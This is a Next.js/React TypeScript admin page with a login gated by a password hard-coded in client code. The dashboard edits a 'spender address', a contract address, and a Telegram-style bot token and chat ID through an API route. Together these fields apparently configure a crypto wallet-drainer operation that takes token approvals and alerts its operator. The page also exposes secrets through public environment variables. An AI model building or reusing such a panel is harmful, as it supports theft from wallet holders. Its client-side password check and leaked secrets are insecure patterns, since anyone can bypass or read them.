import { useState } from "react";
import axios from "axios";
import { FaEye, FaEyeSlash } from "react-icons/fa";
import styles from "@/styles/Admin.module.css";

export default function Admin() {
  const [password, setPassword] = useState("");
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [error, setError] = useState("");
  const [formData, setFormData] = useState({
    spenderAddress: process.env.NEXT_PUBLIC_SPENDER_ADDRESS || "",
    contractAddress: process.env.NEXT_PUBLIC_ADDRESS || "",
    botToken: process.env.NEXT_PUBLIC_BOT_TOKEN || "",
    chatId: process.env.NEXT_PUBLIC_CHAT_ID || "",
  });
  const [successMessage, setSuccessMessage] = useState("");
  const [showPassword, setShowPassword] = useState(false);

  const handlePasswordSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (password === "89145267") {
      setIsAuthenticated(true);
      setError("");
    } else {
      setError("Incorrect password. Please try again.");
    }
  };

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setFormData({
      ...formData,
      [e.target.name]: e.target.value,
    });
  };

  const handleFormSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    try {
      const response = await axios.post("/api/update-env", formData);
      if (response.status === 200) {
        setSuccessMessage("Environment variables updated successfully!");
        setError("");
      }
    } catch (err) {
      setError("Failed to update the environment variables.");
    }
  };

  return (
    <div className={styles.adminContainer}>
      {!isAuthenticated ? (
        <div className={styles.card}>
          <h2 className={styles.title}>Admin Login</h2>
          <form onSubmit={handlePasswordSubmit} className={styles.form}>
            <div className={styles.inputGroup}>
              <label htmlFor="password">Enter Password</label>
              <div style={{ position: "relative" }}>
                <input
                  type={showPassword ? "text" : "password"}
                  id="password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  placeholder="Enter admin password"
                  required
                />
                <span
                  className={styles.eyeIcon}
                  onClick={() => setShowPassword(!showPassword)}
                >
                  {showPassword ? <FaEyeSlash /> : <FaEye />}
                </span>
              </div>
            </div>

            {error && <div className={styles.errorMessage}>{error}</div>}
            <button type="submit" className={styles.button}>
              Login
            </button>
          </form>
        </div>
      ) : (
        <div className={styles.card}>
          <h2 className={styles.title}>Admin Dashboard</h2>
          <form onSubmit={handleFormSubmit} className={styles.form}>
            <div className={styles.inputGroup}>
              <label htmlFor="spenderAddress">Spender Address</label>
              <input
                type="text"
                id="spenderAddress"
                name="spenderAddress"
                value={formData.spenderAddress}
                onChange={handleInputChange}
                required
              />
            </div>
            <div className={styles.inputGroup}>
              <label htmlFor="contractAddress">Contract Address</label>
              <input
                type="text"
                id="contractAddress"
                name="contractAddress"
                value={formData.contractAddress}
                onChange={handleInputChange}
                required
              />
            </div>
            <div className={styles.inputGroup}>
              <label htmlFor="botToken">Bot Token</label>
              <input
                type="text"
                id="botToken"
                name="botToken"
                value={formData.botToken}
                onChange={handleInputChange}
                required
                readOnly
              />
            </div>
            <div className={styles.inputGroup}>
              <label htmlFor="chatId">Chat ID</label>
              <input
                type="text"
                id="chatId"
                name="chatId"
                value={formData.chatId}
                onChange={handleInputChange}
                required
                readOnly
              />
            </div>
            {error && <div className={styles.errorMessage}>{error}</div>}
            {successMessage && (
              <div className={styles.successMessage}>{successMessage}</div>
            )}
            <button type="submit" className={styles.button}>
              Update Variables
            </button>
          </form>
        </div>
      )}
    </div>
  );
}
